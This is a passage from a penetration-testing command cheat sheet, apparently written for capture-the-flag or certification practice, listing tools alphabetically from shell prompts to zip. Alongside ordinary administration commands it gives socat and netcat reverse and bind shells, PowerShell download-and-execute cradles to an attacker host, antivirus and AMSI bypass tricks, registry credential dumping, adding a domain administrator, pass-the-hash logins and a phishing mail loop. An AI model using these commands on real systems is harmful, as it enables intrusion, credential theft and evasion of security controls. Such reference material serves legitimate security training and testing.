PS1="[`date  +"%Y-%m-%d %H:%M"`]\[\033[01;31m\] `ip a | grep -A 1 eth0 | grep inet | awk '{ print $2 }' | cut -d '/' -f 1`\[\033[00m\] \[\033[01;34m\]\w\[\033[00m\] \$ "
```

### Bash: external IP address

```c
PS1='[`date  +"%Y-%m-%d %H:%M"`]\[\033[01;31m\] `curl -s ifconfig.co`\[\033[00m\] \[\033[01;34m\]\w\[\033[00m\] \$ '
```

### ZSH: local IP address

```c
PS1="[20%D %T] %B%F{red}$(ip a | grep -A 1 eth0 | grep inet | awk '{ print $2 }' | cut -d '/' -f 1)%f%b %B%F{blue}%1~%f%b $ "
```

### ZSH: external IP address

```c
PS1="[20%D %T] %B%F{red}$(curl -s ifconfig.co)%f%b %B%F{blue}%1~%f%b $ "
```

### ZSH: Kali Prompt with local IP address

```c
PROMPT="%F{white,bold}%W %* $(ip a | grep -A 1 eth0 | grep inet | awk '{ print $2 }' | cut -d '/' -f 1)"$'%F{%(#.blue.green)}\n┌──${debian_chroot:+($debian_chroot)─}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))─}(%B%F{%(#.red.blue)}%n'$prompt_symbol$'%m%b%F{%(#.blue.green)})-[%B%F{reset}%(6~.%-1~/…/%4~.%5~)%b%F{%(#.blue.green)}]\n└─%B%(#.%F{red}#.%F{blue}$)%b%F{reset} '
```

### PowerShell

For `PowerShell` paste it into the open terminal.

```c
$IPv4 = Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandProperty IPV4Address; function prompt{ "PS" + " [$(Get-Date)] $IPv4> $(get-location) " }
```

## Microsoft Windows

### Command Format

```c
$ echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
```

### Ping

```c
& ping -n 1 <RHOST>
```


### Hide a File

```c
C:\> attrib +h <FILE>
```

## mp64

### Create Custom Charset

```c
$ mp64 --custom-charset1=?l?u?d{}_ $pass?1$wildcard
```

## msg

### Converting .msg-Files to .eml-Files

```c
$ sudo apt-get install libemail-outlook-message-perl libemail-sender-perl
$ msgconvert *.msg
```

## nc / Ncat / netcat

```c
$ nc <RHOST> <RPORT>
$ nc -lvpn <LPORT>
```

### UDP Listener

```c
$ nc -u <RHOST> <RPORT>
$ nc -u -lnvp <LPORT>
```

or

```c
$ nc -lnvup <LPORT>
```

### File Transfer

#### Listener

```c
$ nc -lnvp <LPORT> > <FILE>
```

#### Remote System

```c
$ nc -w 5 <RHOST> <RPORT> < /PATH/TO/FILE/<FILE>
```

#### Execute powershell.exe

```c
$ C:\temp\nc64.exe <RHOST> <RPORT> -e powershell.exe
```

### Scanning

```c
$ nc -zv <RHOST> <RPORT>
```

### Execute Shell Commands

```c
$ nc -nvlkp <LPORT> -c "cat /PATH/TO/FILE/<FILE>"
```

## NetworkManager

```c
$ sudo systemctl start NetworkManager
$ sudo systemctl stop NetworkManager
$ systemctl status NetworkManager
```

## nfsshell

```c
$ sudo apt-get install libreadline-dev libncurses5-dev
$ cd nfsshell
$ make
$ ./nfsshell
```

```c
$ sudo ./nfsshell <RHOST>
nfs> host <RHOST>
Using a privileged port (1023)
Open <RHOST> (<RHOST>) TCP
nfs> export
Export list for <RHOST>:
/home                    everyone
nfs> mount /home
Using a privileged port (1022)
Mount `/home', TCP, transfer size 65536 bytes.
nfs> uid 1000
nfs> gid 1000
nfs> cd <USERNAME>
nfs> ls
```

## npx

### Unpacking .asar-Files

```c
$ npx asar extract <FILE>.asar /PATH/TO/FOLDER/
```

## objectdump

### Check Binary Files

```c
$ objdump -D /lib/x86_64-linux-gnu/security/pam_unix.so | less
```

## OpenBSD

### Switch User

```c
$ doas -u <USERNAME> /bin/sh
```

### Decrypt .enc-Files

```c
$ netpgp --decrypt <FILE>.tar.gz.enc --output=/PATH/TO/FILE/<FILE>.tar.gz
```

## Outlook

### Staring Outlook without a profile

```c
Ctrl + r
outlook.exe /PIM NoEmail
Enter
```

## paste

### Example

```c
$ cat <file>
user1
text1
user2
text2
user3
text3
```

### Usage

```c
$ paste - - d, < <file>
user1,text1
user2,text2
user3,text3
```

## Perl

### Command Execution

```c
$ sudo /usr/bin/perl -e 'exec "cat /root/root.txt"'
```

## PHP

### Perl HTTP Server (Important Note! Every Script there get's executed!)

```c
$ sudo php -S 127.0.0.1:80
```

## PNG

### Fix .png-File Header

```c
$ printf '\x89\x50\x4e\x47' | dd conv=notrunc of=8.png bs=1
```

## PowerShell

### Installation

#### Installation on Linux

```c
$ sudo apt-get install gss-ntlmssp
$ sudo apt-get install powershell
```

### General Usage

#### Allow Script Execution

```c
PS C:\> set-executionpolicy remotesigned
PS C:\> Set-ExecutionPolicy unrestricted
```

### Script Execution Bypass

```c
PS C:\> powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1
```

### Import Module to PowerShell cmdlet

```c
PS C:\> import-module ./<module / powershell script>
```

### Check PowerShell Versions

```c
PS C:\> Set-ExecutionPolicy Unrestricted
PS C:\> powershell -Command "$PSVersionTable.PSVersion"
PS C:\> powershell -c "[Environment]::Is64BitProcess"
```

### Start offsec Session

```c
PS /home/kali> $offsec_session = New-PSSession -ComputerName <RHOST> -Authentication Negotiate -Credential <USERNAME>
PS /home/kali> Enter-PSSession $offsec_session
```

### PSCredential

```c
Import-CliXml
Export-CliXml
```

```c
PS C:\> powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
```

### AntiVirus Handling

#### AntiVirus Bypass for Invoke-Expression (IEX)

```c
PS C:\> <COMMAND> | & ( $PsHOme[4]+$PShoMe[30]+'x')
```

##### Explaination

```c
$PSHome[4]     // equals "i"
$PSHome[30]    // equals "e"
+x             // adds an "x"
```

#### Alternative

```c
PS C:\> $eNV:COmSPeC[4,15,25]-JOiN''
```

##### Explaination

```c
$eNV:COmSPeC[4]     // equals "i"
$eNV:COmSPeC[15]    // equals "e"
$eNV:COmSPeC[25}    // equals "x"
```

#### Alternative

#### Test String

```c
PS C:\> $str = 'amsiinitfailed'
```

#### AMSI Bypass

```c
PS C:\> $str = 'ams' + 'ii' + 'nitf' + 'ailed'
```

### System

#### Show current User

```c
PS C:\> whoami /all
PS C:\> getuserid
```

#### Show Groups

```c
PS C:\> whoami /groups
```

#### Get System Information

```c
PS C:\> systeminfo
```

#### Get Process List

```c
PS C:\> Get-Process
```

#### Get net user Information

```c
PS C:\> net users
PS C:\> net users <USERNAME>
```

#### Get User List

```c
PS C:\> Get-ADUser -Filter * -SearchBase "DC=<TARGET_DOMAIN>,DC=LOCAL"
```

#### Invoke-Expression File Transfer

```c
PS C:\> IEX(IWR http://<LHOST>/<FILE>.ps1) -UseBasicParsing)
```

#### Add new Domain Administrator

```c
PS C:\> $PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String <PASSWORD>
PS C:\> New-ADUser -Name "<USERNAME>" -Description "<DESCRIPTION>" -Enabled $true -AccountPassword $PASSWORD
PS C:\> Add-ADGroupMember -Identity "Domain Admins" -Member <USERNAME>
```

#### Execute Commands in User Context

```c
PS C:\> $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlaintext -Force
PS C:\> $cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $pass)
PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {whoami}
```

#### Execute Scripts with Credentials (Reverse Shell)

```c
PS C:\>  $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
PS C:\>  $cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $pass)
PS C:\>  Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
```

#### New-PSSession

```c
PS C:\Users\<USERNAME>\Downloads\backups> $username = "<DOMAIN>\<USERNAME>"
$username = "<DOMAIN>\<USERNAME>"
PS C:\Users\<USERNAME>\Downloads\backups> $password = "<PASSWORD>"
$password = "<PASSWORD>"
PS C:\Users\<USERNAME>\Downloads\backups> $secstr = New-Object -TypeName System.Security.SecureString
$secstr = New-Object -TypeName System.Security.SecureString
PS C:\Users\<USERNAME>\Downloads\backups> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\Users\<USERNAME>\Downloads\backups> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
PS C:\Users\<USERNAME>\Downloads\backups> new-pssession -computername . -credential $cred
new-pssession -computername . -credential $cred

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          localhost       RemoteMachine   Opened        Microsoft.PowerShell     Available

PS C:\Users\<USERNAME>\Downloads\backups> enter-pssession 1
enter-pssession 1
[localhost]: PS C:\Users\<USERNAME>\Documents> whoami
whoami
<DOMAIN>\<USERNAME>
```

### Network

#### Check Port Status

```c
PS C:\> Test-NetConnection <RHOST> -p <RPORT>
```

#### Connect to Azure

```c
PS C:\> Azure-ADConnect -server 127.0.0.1 -db ADSync
```

### File Handling

#### Out-Default

```c
PS C:\> &{ <COMMAND> }
```

#### Read a File

```c
PS C:\> Get-Content <FILE>
```

#### Show hidden Files

```c
PS C:\> Get-ChildItem . -Force
```

or

```c
PS C:\> GCI -hidden
```

#### Convert a File into Base64

```c
PS C:\> [convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
```

#### Directory Listing

```c
PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {ls 'C:\PATH\TO\DIRECTORY\'}
```

#### Write to a File

```c
PS C:\> Invoke-Command -ComputerName <COMPUTERNAME> -ConfigurationName dc_manage -Credential $cred -ScriptBlock {Set-Content -Path 'C:\PATH\TO\FILE\<FILE>' -Value '<CONTENT>'}
```

#### Move a File

```c
PS C:\> move-item -path C:\PATH\TO\FILE<FILE> -destination C:\PATH\TO\DESTINATION
```

#### Create a .zip-File

```c
PS C:\> Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\<FOLDER> -DestinationPath C:\PATH\TO\FILE<FILE>.zip
```

#### Replace Text in File

```c
PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -ScriptBlock{((cat "C:\PATH\TO\FILE\<FILE>" -Raw) -replace '<TO_REPLACE>','cmd.exe /c <NEW_TEXT>') | set-content -path C:\PATH\TO\FILE\<FILE>} -credential $cred
```

#### File Transfer

```c
PS C:\> &{ iwr -uri http://<LHOST>/<FILE>.exe -o 'C:\PATH\TO\DIRECTORY\<FILE>.exe'}
```

#### Read PowerShell History

```c
PS C:\> type C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

#### Read .lnk-Files

```c
PS C:\> $WScript = New-Object -ComObject WScript.Shell
PS C:\> $shortcut = Get-ChildItem *.lnk
PS C:\> $WScript.CreateShortcut($shortcut)
```

## proc

### Working Directory

```c
$ ls -l /proc/self/cwd
```

### Log File Read

```c
$ cat /proc/self/fd/10
```

## proftp

```c
$ SITE CPFR /home/<USERNAME>/.ssh/id_rsa
$ SITE CPTO /var/tmp/id_rsa
```

## Python2

> https://pip.pypa.io/en/latest/development/release-process/#python-2-support

> https://github.com/pypa/get-pip

```c
$ curl https://bootstrap.pypa.io/get-pip.py | python
```

## Python

### Python HTTP Server

```c
$ sudo python -m SimpleHTTPServer 80
$ sudo python3 -m http.server 80
```

### Python SMTP Server

```c
$ sudo python3 -m smtpd -n -c DebuggingServer <LHOST>:25
```

### Script Conversion

```c
$ 2to3 <OLD_PYTHON_SCRIPT>.py -w <NEW_PYTHON_SCRIPT>.py
$ 2to3-2.7 <OLD_PYTHON_SCRIPT>.py -w <NEW_PYTHON_SCRIPT>.py
```

### Shell Code Conversion

```c
$ python -c 'print "\x41"'
```

### Testing Web Sockets

```c
$ python3 -m websockets ws://<TARGET_DOMAIN>
```

### Fixing Crypto Error

```c
$ pip3 install pycryptodome
```

## Python TOTP

```c
$ sudo pip3 install pyotp
$ python3 -c 'import pyotp; totp = pyotp.TOTP("orxxi4c7orxwwzlo"); print(totp.now())'
```

## rdesktop

```c
$ rdesktop <RHOST>
```

## readpst

```c
$ readpst <FILE>
$ readpst -rS <FILE>
```

## regedit

### Dumping Credentials

```c
PS C:\Users\user\Downloads> reg save hklm\system system
PS C:\Users\user\Downloads> reg save hklm\sam sam
```

```c
C:\> reg.exe save hklm\sam c:\temp\sam.save
C:\> reg.exe save hklm\security c:\temp\security.save
C:\> reg.exe save hklm\system c:\temp\system.save
```

## rev

```c
echo "foobar" | rev
```

## rlwrap

```c
$ rlwrap nc -lnvp <LPORT>
```

## rpm2cpio

### Unpacking .rpm-Files

```c
$ rpm2cpio <FILE>.rpm | cpio -idmv
```

## rsh

```c
$ rsh <RHOST> <COMMAND>
$ rsh -l <USERNAME> <RHOST>
```

## rsync

### Connect

```c
$ nc -vn remote_ip 873
```

```c
$ #list
```

### Download

```c
$ rsync -av rsync://<RHOST>/<FILE>/<REMOTE_DIRECTORY> <LOCAL_DIRECTORY>
```

## sendemail

```c
sendemail -f foobar@<TARGET_DOMAIN> -t nico@<TARGET_DOMAIN> -u "Invoice Attached" -m "You are overdue payment" -a invoice.rtf -s 10.10.10.77 -v
```

## seq

### Create a List of Numbers

```c
$ seq 0 100
```

## SetUID Bit

```c
$ chmod 4755 <FILE>
```

## sftp

```c
$ ftps -P <RPORT> ftpuser@<RHOST>
$ sshfs -p <RPORT> ftpuser@<RHOST>: /mnt/<FOLDER>
```

## showmount

```c
$ /usr/sbin/showmount -e <RHOST>
$ sudo showmount -e <RHOST>

$ chown root:root sid-shell; chmod +s sid-shell
```

## simpleproxy

```c
$ simpleproxy -L <LPORT> -R <RHOST>:<RPORT>
```

## SMB

```c
$ smb:\> allinfo <FILE>
```

## smbclient

```c
$ sudo apt-get install libguestfs-tools
```

### Common Commands

```c
$ smbclient -L ////<RHOST>/ -N
$ smbclient -U "<USERNAME>" -L \\\\<RHOST>\\
$ smbclient -L //<RHOST>// -U <USERNAME>%<PASSWORD>
$ smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
$ mount.cifs //<RHOST>/Backups /mnt/remote
$ guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v
$ smbclient "\\\\<RHOST>\<SHARE>"
$ smbclient \\\\<RHOST>\\<SHARE> -U '<USERNAME>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
```

### Usage

```c
$ smb: \> get <filename>
```

### Anonymous Login

```c
$ smbclient //<RHOST>/<FOLDER> -N
$ smbclient \\\\<RHOST>/<FOLDER> -N
```

### Download multiple Files at once

```c
$ smbclient -Udomainname/fordodone //<RHOST>/<SHARE>
smb: \> cd testdir
smb: \testdir\> get C
NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \testdir\C
smb: \testdir\> prompt
smb: \testdir\> recurse
smb: \testdir\> mget C
getting file ...
```

### Alternatively

```c
smb: \> mask""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

## smbget

```c
$ smbget -R smb://<RHOST>/<folder>
$ smbget -rR smb://<RHOST>/PATH/TO/SHARE/ -U <USERNAME>
```

## smbmap

```c
$ smbmap -H <RHOST>
$ smbmap -H <RHOST> -R
$ smbmap -u <USERNAME> -p <PASSWORD> -H <RHOST>
```

## smbpasswd

```c
$ smbpasswd -r <RHOST> -U <USERNAME>
```

## socat

### Local Proxy

```c
$ socat TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>
```

### Reverse Shell

#### Option 1

##### Local System

```c
$ socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>
```

##### Remote System

```c
$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>
```

#### Option 2

##### Local System

```c
$ socat tcp-listen:5986,reuseaddr,fork tcp:<RHOST>:9002
```

##### Remote System

```c
$ socat tcp-listen:9002,reuseaddr,fork tcp:192.168.122.228:5968 &
```

### UDP Shell

#### Local System

```c
$ socat file:`tty`,echo=0,raw udp-listen:<LPORT>
```

### Bind Shell

```c
$ sudo socat OPENSSL-LISTEN:443,cert=myCert.pem,verify=0,fork EXEC:/bin/bash
$ socat - OPENSSL:<RHOST>:443,verify=0
```

### Send File

```c
$ sudo socat TCP4-LISTEN:443,fork file:<FILE>
$ socat TCP4:<LHOST>:443 file:<FILE>, create    // openssl req -newkey rsa:2048 -nodes -keyout myCert.key -x509 -out myCert.crt; cat myCert.key myCert.crt \> myCert.pem
```

## Spaces Cleanup

```c
$ sed -i -e ‘s/\r$//’ <SCRIPT>
```

The tool `dos2unix` does the job too.

## squid

```c
$ cat /var/spool/squid/netdb.state
```

## squidclient

```c
$ sudo apt-get install squidclient
```

```c
$ squidclient -h <RHOST> -w '<PASSWORD>' mgr:fqdncache
```

## SSH

### Outdated Ciphers

```c
$ ssh user@<RHOST> -oKexAlgorithms=+diffie-hellman-group1-sha1
```

### SSH Shell

#### Command

```c
~C
```

##### Example

```c
SSH>
```

### Create dynamic Port / Proxy

```c
$ ssh -D1080 <RHOST>
```

Then use Proxychains with `socks5` with port `1080/TCP` on localhost.

### Remote Forwarder

```c
$ ssh -R 8080:<LHOST>:80 <RHOST>
```

### Forward Listener

```c
$ ssh -L 8000:127.0.0.1:8000 <USERNAME>@<RHOST>
$ ssh -N -L 1234:127.0.0.1:1234 <USERNAME>@<RHOST>
```

### Reverse SSH Tunnel

```c
$ ssh -L 80:<LHOST>:80 <RHOST>
$ ssh -L 127.0.0.1:80:<LHOST>:80 <RHOST>
$ ssh -L 80:localhost:80 <RHOST>
```

## stat

```c
$ stat <LOCAL_DIRECTORY>
```

## stty

### Limit Line Output

```c
$ stty rows 2
```

## strings

### Show clean Output

```c
$ strings -n 8 <FILE>
```

## SVN

```c
$ svn checkout svn://<RHOST>/
$ svn diff -r 2
```

## swaks

> https://jetmore.org/john/code/swaks/

> https://github.com/jetmore/swaks

```c
$ sudo nv -lnvp 80
$ while read mail; do swaks --to $mail --from <EMAIL> --header "Subject: Test / Test" --body "goto http://<LHOST>/" --server <RHOST>; done < mail.txt
```

## systemd

### Networking Commands

```c
$ ip -c -br address show
$ ip -c -br address show <INTERFACE>
```

### Service Commands

```c
$ systemd-analyze security --no-pager systemd-logind.service
```

## tee

```c
$ cat <FILE> | tee output.txt    // displays the output and also writes it down into a file
```

## tftp

```c
$ tftp <RHOST>
$ status
$ get
$ put
```

### Working Directory

```c
http://<RHOST>/?file=../../../../var/lib/tftpboot/shell.php
```

## timedatectl

```c
$ timedatectl status
$ sudo dpkg-reconfigure tzdata
```

## Time and Date

### Stop virtualbox-guest-utils to stop syncing Time

```c
$ sudo /etc/init.d/virtualbox-guest-utils stop
```

### Options to set the Date and Time

```c
$ sudo net time -c <RHOST>
$ sudo net time set -S <RHOST>
$ sudo ntpdate -b -u <RHOST>
$ sudo timedatectl set-timezone UTC
$ sudo timedatectl list-timezones
$ sudo timedatectl set-timezone '<COUNTRY>/<CITY>'
$ sudo timedatectl set-time 15:58:30
$ sudo timedatectl set-time '2015-11-20 16:14:50'
$ sudo timedatectl set-local-rtc 1
```

### Disable automatic Sync

```c
$ sudo systemctl disable --now chronyd
```

### Get the Server Time

```c
$ sudo nmap -sU -p 123 --script ntp-info <RHOST>
```

### Sync Command

```c
$ sudo date -s "$(curl -si http://<RHOST> | grep "Date: "| sed s/"Date: "//g)"
Sun 02 Jan 2022 01:37:00 PM UTC
```

### Keep in Sync with a Server

```c
$ while [ 1 ]; do sudo ntpdate <RHOST>;done
```

### Hash based on md5 and time

```c
$ php -a
Interactive mode enabled

php > while (true){echo date("D M j G:i:s T Y"); echo " = " ; echo md5('$file_hash' . time());echo "\n";sleep(1);}
```

## tmux

### Options

```c
:set mouse on
:setw -g mode-keys vi
:set synchronize-panes
```

### List Sessions

```c
$ tmux list-sessions
```

### Attach to Session

```c
$ tmux attach-session -t 0
```

### Window List

```c
ctrl b + w
```

### Copy and Paste

```c
ctrl b + [
space
alt w
ctrl b + ]
```

### Search

```c
ctrl b + [    // enter copy
ctrl + s      // enter search from copy mode
ctrl + r      // search reverse direction
```

## TTL

A TTL of `ttl=64` or less, indicates that it is possibly a Linux system.
Windows systems usually use `128`.

## utf8cleaner

```c
$ pip3 install utf8cleaner
$ utf8cleaner --input <FILE>
```

## VDH

### Mounting .vdh-Files

```c
$ sudo mount -t cifs //<RHOST>/<FOLDER> /mnt/<LOCAL_DIRECTORY>/ -o user=null
$ sudo apt-get install libguestfs-tools
$ sudo guestmount --add /PATH/TO/MOUNTPOINT/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/
```

## vim

```c
$ :w !sudo %tee    // write to file without opening it
$ :w <FILE>        // save output into a file
$ :sh              // put vim into the background and opens a new shell
$ :%!sort -u       // use a command and pipe the output back to vim
```

## VirtualBox

### Fix Copy-and-Paste Issue

```c
$ sudo pkill VBoxClient
$ VBoxClient --clipboard
```

## virtualenv

### Linux

```c
$ sudo apt-get install virtualenv
$ virtualenv -p python2.7 venv
$ . venv/bin/activate
```

### Microsoft Windows

```c
C:\Windows\System32> python.exe -m pip install virtualenv
C:\Windows\System32> python.exe -m virtualenv venv
C:\Windows\System32> venv\Scripts\activate
```

## wget

```c
$ wget -N -r -l inf <RHOST>/PATH/TO/REPOSITORY/.git    // reverse download of a git repository
$ wget -m ftp://anonymous:anonymous@<RHOST>
```

## while loop

```c
while read -r line;
do
   echo "$line" ;
done < /PATH/TO/FILE/<FILE>
```

## Writeable Directories

```c
/dev/shm
/tmp
```

## Windows Subsystem for Linux (WSL)

### Open Optional Features Window

```c
Win+r
optionalfeatures
Enter
```

### Select and install Windows Subsystem for Linux

```c
Windows Subsystem for Linux
```

### Set WSL Default Version

```c
PS C:\> wsl --set-default-version 1
```

Open Microsoft App Store and get Kali/Ubuntu.

## xfreerdp

```c
$ xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> +clipboard
```

### Folder Sharing

```c
$ xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore /drive:/PATH/TO/FOLDER,shared
```

### Pass-the-Hash

```c
$ xfreerdp /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /v:<RHOST> /h:1010 /w:1920
```

## Zip

### Extracing Excel Sheets

```c
$ unzip <FILE>.xslx
```

### Creating Excel Sheets

```c
$ zip -r <FILE>.xls
```

### Creating Password Protected .zip Files

```c
$ zip -re <FILE>.zip <FOLDER>/
```
